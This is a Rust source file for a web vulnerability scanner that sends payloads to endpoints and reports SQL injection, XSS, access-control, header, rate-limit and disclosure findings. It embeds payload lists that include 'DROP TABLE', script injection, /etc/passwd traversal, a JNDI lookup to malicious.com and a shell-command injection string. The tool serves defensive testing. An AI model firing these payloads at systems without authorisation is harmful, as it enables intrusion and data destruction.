use anyhow::Result;
use colored::*;
use reqwest;
use std::time::Duration;

pub struct SecurityTester {
    client: reqwest::Client,
    base_url: String,
}

#[derive(Debug, Clone)]
pub struct SecurityTestResult {
    pub test_name: String,
    pub vulnerability: String,
    pub severity: SecuritySeverity,
    pub status: SecurityStatus,
    pub details: String,
    pub recommendation: String,
}

#[derive(Debug, Clone)]
pub enum SecuritySeverity {
    Critical,
    High,
    Medium,
    Low,
    Info,
}

#[derive(Debug, Clone)]
pub enum SecurityStatus {
    Vulnerable,
    Secure,
    Error,
    Warning,
}

impl SecurityTester {
    pub fn new(base_url: String) -> Self {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(10))
            .user_agent("Amalthea-Security-Scanner/0.2.2")
            .build()
            .expect("Failed to create HTTP client");

        Self { client, base_url }
    }

    pub async fn run_security_tests(&self, endpoints: Vec<String>) -> Result<Vec<SecurityTestResult>> {
        let mut results = Vec::new();
        
        println!("🛡️ Starting security testing...");
        
        // 1. SQL Injection Tests
        results.extend(self.test_sql_injection(&endpoints).await?);
        
        // 2. XSS Tests
        results.extend(self.test_xss(&endpoints).await?);
        
        // 3. Authentication Tests
        results.extend(self.test_authentication(&endpoints).await?);
        
        // 4. Authorization Tests
        results.extend(self.test_authorization(&endpoints).await?);
        
        // 5. Input Validation Tests
        results.extend(self.test_input_validation(&endpoints).await?);
        
        // 6. HTTP Security Headers
        results.extend(self.test_security_headers(&endpoints).await?);
        
        // 7. Rate Limiting Tests
        results.extend(self.test_rate_limiting(&endpoints).await?);
        
        // 8. Information Disclosure Tests
        results.extend(self.test_information_disclosure(&endpoints).await?);
        
        Ok(results)
    }

    async fn test_sql_injection(&self, endpoints: &[String]) -> Result<Vec<SecurityTestResult>> {
        let mut results = Vec::new();
        
        let sql_payloads = vec![
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL, username, password FROM users --",
            "1' AND 1=1 --",
            "admin'--",
            "' OR 1=1#",
        ];

        println!("   🔍 Testing SQL Injection vulnerabilities...");
        
        for endpoint in endpoints {
            for payload in &sql_payloads {
                let test_url = format!("{}{}", self.base_url, endpoint);
                
                // Test in query parameters
                let url_with_payload = format!("{}?id={}", test_url, urlencoding::encode(payload));
                
                match self.client.get(&url_with_payload).send().await {
                    Ok(response) => {
                        let _status = response.status().as_u16();
                        let body = response.text().await.unwrap_or_default();
                        
                        if self.detect_sql_error(&body) {
                            results.push(SecurityTestResult {
                                test_name: format!("SQL Injection - {}", endpoint),
                                vulnerability: "SQL Injection".to_string(),
                                severity: SecuritySeverity::Critical,
                                status: SecurityStatus::Vulnerable,
                                details: format!("SQL error detected with payload: {}", payload),
                                recommendation: "Use parameterized queries and input validation".to_string(),
                            });
                        }
                    },
                    Err(_) => continue,
                }
            }
        }
        
        Ok(results)
    }

    async fn test_xss(&self, endpoints: &[String]) -> Result<Vec<SecurityTestResult>> {
        let mut results = Vec::new();
        
        let xss_payloads = vec![
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
        ];

        println!("   🔍 Testing XSS vulnerabilities...");
        
        for endpoint in endpoints {
            for payload in &xss_payloads {
                let test_url = format!("{}{}", self.base_url, endpoint);
                let url_with_payload = format!("{}?q={}", test_url, urlencoding::encode(payload));
                
                match self.client.get(&url_with_payload).send().await {
                    Ok(response) => {
                        let body = response.text().await.unwrap_or_default();
                        
                        if body.contains(payload) && !body.contains("&lt;script&gt;") {
                            results.push(SecurityTestResult {
                                test_name: format!("XSS - {}", endpoint),
                                vulnerability: "Cross-Site Scripting (XSS)".to_string(),
                                severity: SecuritySeverity::High,
                                status: SecurityStatus::Vulnerable,
                                details: format!("Unescaped payload reflected: {}", payload),
                                recommendation: "Implement proper output encoding and CSP headers".to_string(),
                            });
                        }
                    },
                    Err(_) => continue,
                }
            }
        }
        
        Ok(results)
    }

    async fn test_authentication(&self, endpoints: &[String]) -> Result<Vec<SecurityTestResult>> {
        let mut results = Vec::new();
        
        println!("   🔍 Testing authentication mechanisms...");
        
        for endpoint in endpoints {
            let test_url = format!("{}{}", self.base_url, endpoint);
            
            // Test without authentication
            match self.client.get(&test_url).send().await {
                Ok(response) => {
                    let status = response.status().as_u16();
                    
                    if status == 200 && endpoint.contains("admin") || endpoint.contains("user") {
                        results.push(SecurityTestResult {
                            test_name: format!("Missing Authentication - {}", endpoint),
                            vulnerability: "Missing Authentication".to_string(),
                            severity: SecuritySeverity::High,
                            status: SecurityStatus::Vulnerable,
                            details: "Sensitive endpoint accessible without authentication".to_string(),
                            recommendation: "Implement proper authentication mechanisms".to_string(),
                        });
                    }
                },
                Err(_) => continue,
            }
        }
        
        Ok(results)
    }

    async fn test_authorization(&self, endpoints: &[String]) -> Result<Vec<SecurityTestResult>> {
        let mut results = Vec::new();
        
        println!("   🔍 Testing authorization controls...");
        
        // Test with different user roles
        let test_tokens = vec![
            ("user", "user-token-123"),
            ("admin", "admin-token-456"),
            ("guest", "guest-token-789"),
        ];
        
        for endpoint in endpoints {
            for (role, token) in &test_tokens {
                let test_url = format!("{}{}", self.base_url, endpoint);
                
                let response = self.client
                    .get(&test_url)
                    .header("Authorization", format!("Bearer {}", token))
                    .send()
                    .await;
                
                if let Ok(resp) = response {
                    let status = resp.status().as_u16();
                    
                    if status == 200 && endpoint.contains("admin") && *role != "admin" {
                        results.push(SecurityTestResult {
                            test_name: format!("Authorization Bypass - {}", endpoint),
                            vulnerability: "Broken Access Control".to_string(),
                            severity: SecuritySeverity::Critical,
                            status: SecurityStatus::Vulnerable,
                            details: format!("Admin endpoint accessible by {} role", role),
                            recommendation: "Implement proper role-based access control".to_string(),
                        });
                    }
                }
            }
        }
        
        Ok(results)
    }

    async fn test_input_validation(&self, endpoints: &[String]) -> Result<Vec<SecurityTestResult>> {
        let mut results = Vec::new();
        
        println!("   🔍 Testing input validation...");
        
        let malicious_inputs = vec![
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "${jndi:ldap://malicious.com/a}",
            "{{7*7}}",
            "<%= 7*7 %>",
            "'; ls -la; echo '",
        ];
        
        for endpoint in endpoints {
            for input in &malicious_inputs {
                let test_url = format!("{}{}", self.base_url, endpoint);
                let url_with_input = format!("{}?param={}", test_url, urlencoding::encode(input));
                
                match self.client.get(&url_with_input).send().await {
                    Ok(response) => {
                        let body = response.text().await.unwrap_or_default();
                        
                        if self.detect_path_traversal(&body) || self.detect_command_injection(&body) {
                            results.push(SecurityTestResult {
                                test_name: format!("Input Validation - {}", endpoint),
                                vulnerability: "Insufficient Input Validation".to_string(),
                                severity: SecuritySeverity::Medium,
                                status: SecurityStatus::Vulnerable,
                                details: format!("Malicious input processed: {}", input),
                                recommendation: "Implement strict input validation and sanitization".to_string(),
                            });
                        }
                    },
                    Err(_) => continue,
                }
            }
        }
        
        Ok(results)
    }

    async fn test_security_headers(&self, endpoints: &[String]) -> Result<Vec<SecurityTestResult>> {
        let mut results = Vec::new();
        
        println!("   🔍 Testing security headers...");
        
        for endpoint in endpoints {
            let test_url = format!("{}{}", self.base_url, endpoint);
            
            match self.client.get(&test_url).send().await {
                Ok(response) => {
                    let headers = response.headers();
                    
                    // Check for missing security headers
                    let security_headers = vec![
                        ("X-Content-Type-Options", "nosniff"),
                        ("X-Frame-Options", "DENY"),
                        ("X-XSS-Protection", "1; mode=block"),
                        ("Strict-Transport-Security", "max-age="),
                        ("Content-Security-Policy", "default-src"),
                    ];
                    
                    for (header_name, expected_value) in security_headers {
                        if let Some(header_value) = headers.get(header_name) {
                            if !header_value.to_str().unwrap_or("").contains(expected_value) {
                                results.push(SecurityTestResult {
                                    test_name: format!("Security Header - {}", header_name),
                                    vulnerability: "Missing Security Header".to_string(),
                                    severity: SecuritySeverity::Medium,
                                    status: SecurityStatus::Warning,
                                    details: format!("Header {} not properly configured", header_name),
                                    recommendation: format!("Configure {} header properly", header_name),
                                });
                            }
                        } else {
                            results.push(SecurityTestResult {
                                test_name: format!("Security Header - {}", header_name),
                                vulnerability: "Missing Security Header".to_string(),
                                severity: SecuritySeverity::Medium,
                                status: SecurityStatus::Vulnerable,
                                details: format!("Header {} is missing", header_name),
                                recommendation: format!("Add {} header", header_name),
                            });
                        }
                    }
                },
                Err(_) => continue,
            }
        }
        
        Ok(results)
    }

    async fn test_rate_limiting(&self, endpoints: &[String]) -> Result<Vec<SecurityTestResult>> {
        let mut results = Vec::new();
        
        println!("   🔍 Testing rate limiting...");
        
        for endpoint in endpoints {
            let test_url = format!("{}{}", self.base_url, endpoint);
            let mut success_count = 0;
            
            // Send 20 rapid requests
            for _ in 0..20 {
                if let Ok(response) = self.client.get(&test_url).send().await {
                    if response.status().is_success() {
                        success_count += 1;
                    }
                }
                tokio::time::sleep(Duration::from_millis(50)).await;
            }
            
            if success_count > 15 {
                results.push(SecurityTestResult {
                    test_name: format!("Rate Limiting - {}", endpoint),
                    vulnerability: "Missing Rate Limiting".to_string(),
                    severity: SecuritySeverity::Medium,
                    status: SecurityStatus::Vulnerable,
                    details: format!("Endpoint processed {} out of 20 rapid requests", success_count),
                    recommendation: "Implement rate limiting to prevent abuse".to_string(),
                });
            }
        }
        
        Ok(results)
    }

    async fn test_information_disclosure(&self, endpoints: &[String]) -> Result<Vec<SecurityTestResult>> {
        let mut results = Vec::new();
        
        println!("   🔍 Testing information disclosure...");
        
        for endpoint in endpoints {
            let test_url = format!("{}{}", self.base_url, endpoint);
            
            match self.client.get(&test_url).send().await {
                Ok(response) => {
                    let headers = response.headers().clone();
                    let body = response.text().await.unwrap_or_default();
                    
                    // Check for sensitive information in response
                    let sensitive_patterns = vec![
                        "password", "secret", "key", "token", "database", 
                        "config", "env", "debug", "stack trace", "exception"
                    ];
                    
                    for pattern in sensitive_patterns {
                        if body.to_lowercase().contains(pattern) {
                            results.push(SecurityTestResult {
                                test_name: format!("Information Disclosure - {}", endpoint),
                                vulnerability: "Sensitive Information Exposure".to_string(),
                                severity: SecuritySeverity::Medium,
                                status: SecurityStatus::Warning,
                                details: format!("Response contains sensitive keyword: {}", pattern),
                                recommendation: "Remove sensitive information from responses".to_string(),
                            });
                        }
                    }
                    
                    // Check server header
                    if let Some(server_header) = headers.get("server") {
                        let server_value = server_header.to_str().unwrap_or("");
                        if server_value.contains("/") {
                            results.push(SecurityTestResult {
                                test_name: format!("Server Information - {}", endpoint),
                                vulnerability: "Server Information Disclosure".to_string(),
                                severity: SecuritySeverity::Low,
                                status: SecurityStatus::Warning,
                                details: format!("Server header reveals version: {}", server_value),
                                recommendation: "Hide server version information".to_string(),
                            });
                        }
                    }
                },
                Err(_) => continue,
            }
        }
        
        Ok(results)
    }

    fn detect_sql_error(&self, body: &str) -> bool {
        let sql_error_patterns = vec![
            "mysql_fetch_array",
            "ORA-01756",
            "Microsoft OLE DB Provider",
            "java.sql.SQLException",
            "PostgreSQL query failed",
            "Warning: mysql_",
            "valid MySQL result",
            "MySQLSyntaxErrorException",
            "sqlite3.OperationalError",
        ];
        
        sql_error_patterns.iter().any(|pattern| body.contains(pattern))
    }

    fn detect_path_traversal(&self, body: &str) -> bool {
        body.contains("root:") || body.contains("[drivers]") || body.contains("/etc/passwd")
    }

    fn detect_command_injection(&self, body: &str) -> bool {
        body.contains("uid=") || body.contains("gid=") || body.contains("total ")
    }
}

pub fn print_security_report(results: &[SecurityTestResult]) {
    println!("\n🛡️ Security Test Report");
    println!("{}", "=".repeat(50));
    
    let mut critical = 0;
    let mut high = 0;
    let mut medium = 0;
    let mut low = 0;
    let mut info = 0;
    
    for result in results {
        match result.severity {
            SecuritySeverity::Critical => critical += 1,
            SecuritySeverity::High => high += 1,
            SecuritySeverity::Medium => medium += 1,
            SecuritySeverity::Low => low += 1,
            SecuritySeverity::Info => info += 1,
        }
        
        let status_color = match result.status {
            SecurityStatus::Vulnerable => "🔴 VULNERABLE".red(),
            SecurityStatus::Warning => "🟡 WARNING".yellow(),
            SecurityStatus::Secure => "🟢 SECURE".green(),
            SecurityStatus::Error => "⚫ ERROR".bright_black(),
        };
        
        let severity_color = match result.severity {
            SecuritySeverity::Critical => "CRITICAL".red().bold(),
            SecuritySeverity::High => "HIGH".red(),
            SecuritySeverity::Medium => "MEDIUM".yellow(),
            SecuritySeverity::Low => "LOW".blue(),
            SecuritySeverity::Info => "INFO".cyan(),
        };
        
        println!("\n📋 {}", result.test_name.bright_cyan());
        println!("   Status: {}", status_color);
        println!("   Severity: {}", severity_color);
        println!("   Vulnerability: {}", result.vulnerability);
        println!("   Details: {}", result.details);
        println!("   Recommendation: {}", result.recommendation.bright_white());
    }
    
    println!("\n📊 Summary:");
    println!("   🔴 Critical: {}", critical.to_string().red().bold());
    println!("   🟠 High: {}", high.to_string().red());
    println!("   🟡 Medium: {}", medium.to_string().yellow());
    println!("   🔵 Low: {}", low.to_string().blue());
    println!("   ℹ️  Info: {}", info.to_string().cyan());
    
    let total_issues = critical + high + medium + low;
    if total_issues == 0 {
        println!("\n✅ No security vulnerabilities detected!");
    } else {
        println!("\n⚠️  Total security issues found: {}", total_issues.to_string().red().bold());
    }
}
